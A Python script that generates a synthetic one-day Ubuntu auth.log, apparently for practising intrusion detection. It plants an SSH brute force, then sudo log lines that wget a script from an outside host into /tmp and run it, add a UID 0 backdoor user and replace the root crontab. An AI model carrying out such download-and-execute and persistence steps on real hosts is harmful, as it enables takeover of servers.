#!/usr/bin/env python3
"""
Synthetic /var/log/auth.log for an Ubuntu web server "web01" (one day: Nov 3, 2026).

Planted
  ATTACK   198.51.100.77: SSH password guessing (invalid users, then 'deploy') -> Accepted password
           -> sudo wget a script to /tmp -> run it -> new UID 0 user 'sysupdate' -> root crontab replaced
  BENIGN   'ansible' automation (publickey from 10.10.10.60) runs many sudo commands every night
  BENIGN   ops admin 'opsadmin' logs in with a key from the office, one typo, then sudo apt upgrade
  NOISE    internet scanners trying common usernames; CRON sessions every 10 minutes

Usage: python generate_authlog.py [--seed 5]
"""

from __future__ import annotations

import argparse
import os
import random
from datetime import datetime, timedelta

DAY = datetime(2026, 11, 3)
HOST = "web01"


class Log:
    def __init__(self, seed):
        self.r = random.Random(seed)
        self.lines = []
        self.pid = 1000

    def next_pid(self):
        self.pid += self.r.randint(1, 9)
        return self.pid

    def add(self, t: datetime, prog: str, msg: str, pid=None):
        stamp = t.strftime("%b %d %H:%M:%S").replace(" 0", "  ", 1) if t.day < 10 else t.strftime("%b %d %H:%M:%S")
        tag = f"{prog}[{pid}]" if pid else prog
        self.lines.append((t, f"{stamp} {HOST} {tag}: {msg}"))

    def at(self, h, m=0, s=0):
        return DAY + timedelta(hours=h, minutes=m, seconds=s)

    def cron(self):
        t = self.at(0, 0, 1)
        while t.day == DAY.day:
            pid = self.next_pid()
            self.add(t, "CRON", "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)", pid)
            self.add(t + timedelta(seconds=1), "CRON", "pam_unix(cron:session): session closed for user root", pid)
            t += timedelta(minutes=10)

    def scanners(self):
        names = ["admin", "test", "oracle", "ubuntu", "user", "postgres", "git", "pi"]
        for _ in range(30):
            ip = f"203.0.113.{self.r.randint(100, 250)}"
            t = self.at(self.r.randint(0, 23), self.r.randint(0, 59), self.r.randint(0, 59))
            for _ in range(self.r.randint(1, 3)):
                pid = self.next_pid()
                name = self.r.choice(names)
                port = self.r.randint(30000, 65000)
                self.add(t, "sshd", f"Invalid user {name} from {ip} port {port}", pid)
                self.add(t + timedelta(seconds=2), "sshd", f"Failed password for invalid user {name} from {ip} port {port} ssh2", pid)
                t += timedelta(seconds=self.r.randint(5, 40))

    def ansible(self):
        t = self.at(1, 30, 0)
        pid = self.next_pid()
        self.add(t, "sshd", "Accepted publickey for ansible from 10.10.10.60 port 41022 ssh2: ED25519 SHA256:q8Yd3Kf1aAnsibleKey", pid)
        self.add(t, "sshd", "pam_unix(sshd:session): session opened for user ansible(uid=1002) by (uid=0)", pid)
        cmds = ["/usr/bin/apt-get update", "/usr/bin/apt-get -y upgrade", "/usr/bin/systemctl restart nginx",
                "/usr/bin/cp /tmp/ansible-tmp/nginx.conf /etc/nginx/nginx.conf", "/usr/sbin/nginx -t",
                "/usr/bin/systemctl reload nginx"]
        for c in cmds:
            t += timedelta(seconds=self.r.randint(20, 90))
            self.add(t, "sudo", f"  ansible : PWD=/home/ansible ; USER=root ; COMMAND={c}")
        self.add(t + timedelta(seconds=5), "sshd", "pam_unix(sshd:session): session closed for user ansible", pid)

    def opsadmin(self):
        t = self.at(14, 12, 33)
        pid = self.next_pid()
        self.add(t, "sshd", "Failed publickey for opsadmin from 10.10.20.105 port 52211 ssh2: RSA SHA256:oldKeyX9", pid)
        pid = self.next_pid()
        t += timedelta(seconds=6)
        self.add(t, "sshd", "Accepted publickey for opsadmin from 10.10.20.105 port 52214 ssh2: ED25519 SHA256:opsAdminKey2", pid)
        self.add(t, "sshd", "pam_unix(sshd:session): session opened for user opsadmin(uid=1000) by (uid=0)", pid)
        t += timedelta(minutes=1)
        self.add(t, "sudo", " opsadmin : TTY=pts/1 ; PWD=/home/opsadmin ; USER=root ; COMMAND=/usr/bin/apt upgrade")
        t += timedelta(minutes=9)
        self.add(t, "sshd", "pam_unix(sshd:session): session closed for user opsadmin", pid)

    def attack(self):
        ip = "198.51.100.77"
        t = self.at(2, 11, 4)
        for name in ("admin", "webadmin", "deployer"):
            pid = self.next_pid()
            port = self.r.randint(40000, 60000)
            self.add(t, "sshd", f"Invalid user {name} from {ip} port {port}", pid)
            self.add(t + timedelta(seconds=1), "sshd", f"Failed password for invalid user {name} from {ip} port {port} ssh2", pid)
            t += timedelta(seconds=self.r.randint(4, 9))
        for _ in range(23):
            pid = self.next_pid()
            self.add(t, "sshd", f"Failed password for deploy from {ip} port {self.r.randint(40000, 60000)} ssh2", pid)
            t += timedelta(seconds=self.r.randint(6, 14))
        pid = self.next_pid()
        t += timedelta(seconds=20)
        self.add(t, "sshd", f"Accepted password for deploy from {ip} port {self.r.randint(40000, 60000)} ssh2", pid)
        self.add(t, "sshd", "pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)", pid)
        steps = [
            (95, " deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id"),
            (40, " deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget -q http://203.0.113.99/u.sh -O /tmp/.u.sh"),
            (12, " deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/chmod +x /tmp/.u.sh"),
            (5, " deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash /tmp/.u.sh"),
        ]
        for delay, msg in steps:
            t += timedelta(seconds=delay)
            self.add(t, "sudo", msg)
        t += timedelta(seconds=3)
        self.add(t, "useradd", "new user: name=sysupdate, UID=0, GID=0, home=/root, shell=/bin/bash, from=/dev/pts/0",
                 self.next_pid())
        t += timedelta(seconds=2)
        self.add(t, "passwd", "pam_unix(passwd:chauthtok): password changed for sysupdate", self.next_pid())
        t += timedelta(seconds=9)
        self.add(t, "crontab", "(root) REPLACE (root)", self.next_pid())
        t += timedelta(minutes=2)
        self.add(t, "sshd", "pam_unix(sshd:session): session closed for user deploy", pid)

    def build(self):
        self.cron()
        self.scanners()
        self.ansible()
        self.opsadmin()
        self.attack()
        self.lines.sort(key=lambda x: x[0])
        return [l for _, l in self.lines]


def main(argv=None) -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--seed", type=int, default=5)
    p.add_argument("--out", default=os.path.join(os.path.dirname(os.path.abspath(__file__)), "data"))
    a = p.parse_args(argv)
    os.makedirs(a.out, exist_ok=True)
    lines = Log(a.seed).build()
    with open(os.path.join(a.out, "auth.log"), "w", encoding="utf-8", newline="\n") as fh:
        fh.write("\n".join(lines) + "\n")
    print(f"Wrote {len(lines)} lines to {a.out}/auth.log")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
